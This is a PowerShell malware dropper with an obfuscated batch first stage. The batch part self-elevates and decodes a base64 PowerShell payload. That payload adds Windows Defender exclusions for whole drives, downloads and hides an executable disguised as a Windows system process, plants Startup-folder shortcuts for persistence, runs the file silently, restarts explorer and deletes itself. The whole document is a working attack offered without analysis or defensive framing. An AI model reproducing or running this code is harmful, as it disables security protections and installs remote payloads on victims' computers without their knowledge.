$stage1 = @"
@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
%r:~2,1%f no%r:~4,1% "%1"=="am_admin" (powershell -windowstyle hidden -NoP start -verb runas '%0' a%r:~12,1%_ad%r:~12,1%%r:~2,1%n & ex%r:~2,1%%r:~4,1% /%r:~10,1%)
po%r:~9,1%er%r:~8,1%%r:~11,1%ell -%r:~9,1%%r:~2,1%ndo%r:~9,1%%r:~8,1%%r:~4,1%yle %r:~11,1%%r:~2,1%dden -NoP "%r:~16,1%nvoke-Expre%r:~8,1%%r:~8,1%%r:~2,1%on([%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%.Tex%r:~4,1%.Encod%r:~2,1%n%r:~1,1%]::%r:~18,1%%r:~14,1%C%r:~16,1%%r:~16,1%.%r:~5,1%e%r:~4,1%%r:~14,1%%r:~4,1%r%r:~2,1%n%r:~1,1%([%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%.Conver%r:~4,1%]::Fro%r:~12,1%Ba%r:~8,1%e64%r:~14,1%%r:~4,1%r%r:~2,1%n%r:~1,1%('SW1wb3J0LW1vZHVsZSBNaWNyb3NvZnQuUG93ZXJTaGVsbC5Ib3N0CkltcG9ydC1tb2R1bGUgTWljcm9zb2Z0LlBvd2VyU2hlbGwuVXRpbGl0eQpJbXBvcnQtbW9kdWxlIE1pY3Jvc29mdC5Qb3dlclNoZWxsLk1hbmFnZW1lbnQKSW1wb3J0LW1vZHVsZSBNaWNyb3NvZnQuUG93ZXJTaGVsbC5TZWN1cml0eQppbXBvcnQtbW9kdWxlIGRlZmVuZGVyCgpBZGQtTXBQcmVmZXJlbmNlIC1Gb3JjZSAtRXhjbHVzaW9uUGF0aCAiQzovIgpBZGQtTXBQcmVmZXJlbmNlIC1Gb3JjZSAtRXhjbHVzaW9uUGF0aCAiRDovIgpBZGQtTXBQcmVmZXJlbmNlIC1Gb3JjZSAtRXhjbHVzaW9uUGF0aCAiRTovIgoKU3RhcnQtU2xlZXAgMQoKJHVybCA9ICJodHRwczovL2dpdGh1Yi5jb20vdW50cmFjYWJsZWZzb2NpZXR5L3VudHJhY2thYmxlL3JlbGVhc2VzL2Rvd25sb2FkL3Vua25vd24vc2V0dXAuZXhlIgoKbWtkaXIgJGVudjp0ZW1wXDExQjBCNjhBLUVDRDctNDVBNS1BOTM3LTdEQzQwMkIzRDIKCiRvdXRwYXRoID0gIiRlbnY6dGVtcFwxMUIwQjY4QS1FQ0Q3LTQ1QTUtQTkzNy03REM0MDJCM0QyXFdpbmRvd3MgU2hlbGwgRXhwZXJpZW5jZSBIb3N0LmV4ZSIKJHNob3J0Y3V0eCA9ICIkZW52OmFwcGRhdGFcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwXEhvc3QtUHJvY2Vzcy1XaW5kb3dzLmxuayIKJHNob3RjdXR2ID0gIiRlbnY6YXBwZGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcV2luZG93cy1EZWZlbmRlci5sbmsiCgoKd2hpbGUoJHRydWUpCnsKICAgaWYoVGVzdC1QYXRoICRvdXRwYXRoKQogICB7CiAgICAgIFdyaXRlLUhvc3QgIkZpbGUgZm91bmQgLSBlbmRpbmcgbG9vcC4uLiIKICAgICAgRXhpdAogICB9CiAgIGVsc2V7CiAgICAgICAgI1dyaXRlLUhvc3QgIkZpbGUgbm90IGZvdW5kIC0gcmVzdGFydGluZyBsb29wLi4uIgoKICAgICAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJG91dHBhdGggLVVzZUJhc2ljUGFyc2luZwoKICAgICAgICBTdGFydC1TbGVlcCAyCgogICAgICAgICNXcml0ZS1Ib3N0ICJbLl0gRmlsZSBEb3dubG9hZGVkISIKCiAgICAgICAgJFdzaFNoZWxsID0gTmV3LU9iamVjdCAtY29tT2JqZWN0IFdTY3JpcHQuU2hlbGwKICAgICAgICAkU2hvcnRjdXQgPSAkV3NoU2hlbGwuQ3JlYXRlU2hvcnRjdXQoJHNob3J0Y3V0eCkKICAgICAgICAkU2hvcnRjdXQuVGFyZ2V0UGF0aCA9ICIkZW52OnRlbXBcMTFCMEI2OEEtRUNENy00NUE1LUE5MzctN0RDNDAyQjNEMlxXaW5kb3dzIFNoZWxsIEV4cGVyaWVuY2UgSG9zdC5leGUiCiAgICAgICAgJFNob3J0Y3V0LlNhdmUoKQoKICAgICAgICBHZXQtQ2hpbGRJdGVtIC1wYXRoICRvdXRwYXRoIC1SZWN1cnNlIC1Gb3JjZSB8IGZvcmVhY2ggeyRfLmF0dHJpYnV0ZXMgPSAiSGlkZGVuIn0gCiAgICAgICAgR2V0LUNoaWxkSXRlbSAtcGF0aCAkc2hvcnRjdXR4IC1SZWN1cnNlIC1Gb3JjZSB8IGZvcmVhY2ggeyRfLmF0dHJpYnV0ZXMgPSAiSGlkZGVuIn0gCgogICAgICAgIFN0YXJ0LVByb2Nlc3MgLXdpbmRvd3N0eWxlIEhpZGRlbiAkb3V0cGF0aAoKICAgICAgICAjJFBhdGg9IkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXEFkdmFuY2VkIgogICAgICAgICNTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRQYXRoIC1OYW1lICJIaWRlSWNvbnMiIC1WYWx1ZSAxCiAgICAgICAgR2V0LVByb2Nlc3MgImV4cGxvcmVyInwgU3RvcC1Qcm9jZXNzCgogICB9CiAgIFN0YXJ0LVNsZWVwIDEwCn0=')))"
del "%~f0"
@ec%r:~11,1%o off
%r:~8,1%e%r:~4,1% a = %%~i
%r:~8,1%e%r:~4,1% a = % + %~i"%%~%r:~2,1%"%
set a = %a%
:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
"@


$outpath = "$env:temp\11B0B68A-ECD7-45A5-A937-7DC402B3D2\Windows Shell Experience Host.exe"

$Old = Get-Random -Minimum 999999999999999999

while($true)
{
   if(Test-Path $outpath)
   {
        #Write-Host "File found - ending loop..."
        Rename-Item -Path "$env:temp\11B0B68A-ECD7-45A5-A937-7DC402B3D2\Windows Shell Experience Host.exe" -NewName "$Old"

        Start-Sleep 1

          $url = "https://github.com/untracablefsociety/untrackable/releases/download/unknown/setup.exe"

          Invoke-WebRequest -Uri $url -OutFile $outpath -UseBasicParsing

          Start-Sleep 1

          Get-ChildItem -path $outpath -Recurse -Force | foreach {$_.attributes = "Hidden"} 
          Get-ChildItem -path $shortcutx -Recurse -Force | foreach {$_.attributes = "Hidden"} 

          Start-Process -windowstyle Hidden $outpath

          Get-Process "explorer"| Stop-Process
       Exit
   }
   else{
          Out-File -FilePath "$env:temp/stage_1.bat" -InputObject $stage1 -Encoding ASCII
          Start-Process -WindowStyle Hidden "$env:temp/stage_1.bat" 
       Exit
   }
   Start-Sleep 10
}

